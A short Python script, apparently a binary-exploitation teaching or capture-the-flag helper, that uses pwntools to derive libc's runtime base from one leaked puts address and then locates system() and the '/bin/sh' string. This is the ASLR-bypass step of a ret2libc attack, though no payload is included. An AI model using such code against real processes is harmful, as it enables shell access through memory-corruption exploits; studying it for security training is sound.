#!/usr/bin/env python3
"""Turn one leaked pointer into a full region base + symbol map."""
from pwn import ELF

def libc_base_from(leaked_addr: int, symbol: str, libc: ELF) -> int:
    """Given a leaked address that is `libc.symbols[symbol]` at runtime,
    return the runtime base of the libc mapping."""
    off = libc.symbols[symbol]                 # ❶ on-disk offset
    assert leaked_addr > off, "leak looks wrong for this symbol"
    base = leaked_addr - off                   # ❷ the one subtraction
    assert base & 0xfff == 0, \
        f"libc base not page-aligned: {base:#x}"   # ❸ sanity check
    return base

def resolve(libc: ELF, base: int, name: str) -> int:
    return base + libc.symbols[name]           # ❹ every other symbol, free

if __name__ == "__main__":
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    leaked = 0x7f4a1b6ceeb0                    # illustrative
    base   = libc_base_from(leaked, "puts", libc)
    print(f"libc base    = {base:#x}")
    print(f"system       = {resolve(libc, base, 'system'):#x}")
    print(f"/bin/sh str  = {base + next(libc.search(b'/bin/sh')):#x}")
